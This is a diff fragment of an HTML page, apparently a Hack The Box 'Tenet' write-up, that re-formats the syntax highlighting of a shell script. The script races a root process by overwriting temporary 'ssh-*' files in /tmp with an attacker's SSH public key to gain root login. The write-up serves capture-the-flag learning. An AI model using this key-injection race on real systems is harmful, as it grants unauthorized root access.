  it returned back with "Error in adding $sshName to authorized_keys file!".
 </p>
-<pre class="codehilite"><code>while :;
-do
-    files=`find /tmp -name "ssh-*" -maxdepth 1 2&gt;/dev/null`
-    for p in $files
-    do
-        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzKUsFpNACl75KbSr4trd57XlBGm+x7FB8Jo0eWUuBITVLYu1UHpck+UcAclH4sWPRHUlUMB9zzi4mvX0PEniWb14rC49M0om8I+/7vhtSUiOJ/DC/U/Cb8t05Y5nOkmwAAhb0mlyXFq3OprFKRKCzPMNY2OChdLndyw+V8y53OsVEjzUuFNOo+2J/B8kYLxW+MRKWxEugjpY7CZF9m6fqAFo0caSjYh9454/2OaItCOqwQD06dedPQQbp7yZRv4y//ST6NjX96S3xlPX6oZU4mkJxmgn4S+ufcczSvDT6HEfHDgF1+7GoZn3szQvLH5CCV3GH0a8aC9NLWrPXCVgeUxQMlEBV4kSyPaTeuiW66mDu5+4+nQ3XYjKm/jLDQzs5+IKpbYn/5NpKoRmktP4kAcmMFoFrUVZC9d1lQDmTKcF3ZJVG6KgW68+Xwj+RmIdiLSufeXdkbudInYeTBXCeLEO1nAetQj1kaPp7DFN6+tLPmg+C9UDqNfnl8cCzB3c= ghost@yourshell" &gt; $p;
-        echo "Dumped Payload Into $p"
-    done
-done
+<div class="codehilite">
+ <pre><span></span><code><span class="k">while</span><span class="w"> </span><span class="p">:;</span><span class="w"></span>
+<span class="n">do</span><span class="w"></span>
+<span class="w">    </span><span class="n">files</span><span class="o">=</span><span class="err">`</span><span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="w"> </span><span class="o">-</span><span class="n">name</span><span class="w"> </span><span class="s2">"ssh-*"</span><span class="w"> </span><span class="o">-</span><span class="n">maxdepth</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="nb nb-Type">null</span><span class="err">`</span><span class="w"></span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="o">$</span><span class="n">files</span><span class="w"></span>
+<span class="w">    </span><span class="n">do</span><span class="w"></span>
+<span class="w">        </span><span class="n">echo</span><span class="w"> </span><span class="s2">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzKUsFpNACl75KbSr4trd57XlBGm+x7FB8Jo0eWUuBITVLYu1UHpck+UcAclH4sWPRHUlUMB9zzi4mvX0PEniWb14rC49M0om8I+/7vhtSUiOJ/DC/U/Cb8t05Y5nOkmwAAhb0mlyXFq3OprFKRKCzPMNY2OChdLndyw+V8y53OsVEjzUuFNOo+2J/B8kYLxW+MRKWxEugjpY7CZF9m6fqAFo0caSjYh9454/2OaItCOqwQD06dedPQQbp7yZRv4y//ST6NjX96S3xlPX6oZU4mkJxmgn4S+ufcczSvDT6HEfHDgF1+7GoZn3szQvLH5CCV3GH0a8aC9NLWrPXCVgeUxQMlEBV4kSyPaTeuiW66mDu5+4+nQ3XYjKm/jLDQzs5+IKpbYn/5NpKoRmktP4kAcmMFoFrUVZC9d1lQDmTKcF3ZJVG6KgW68+Xwj+RmIdiLSufeXdkbudInYeTBXCeLEO1nAetQj1kaPp7DFN6+tLPmg+C9UDqNfnl8cCzB3c= ghost@yourshell"</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">$</span><span class="n">p</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="n">echo</span><span class="w"> </span><span class="s2">"Dumped Payload Into $p"</span><span class="w"></span>
+<span class="w">    </span><span class="n">done</span><span class="w"></span>
+<span class="n">done</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  <img alt="" class="center" src="/images/writeups/htb_machines/tenet/letsgetroot.png"/>
 </p>
@@ -649,7 +666,7 @@ done
 </div>
 </div>
 </section>
-<section class="wrapper style1 ">
+<section class="wrapper style6 ">
 <div class="inner">
 <div class="content">
 
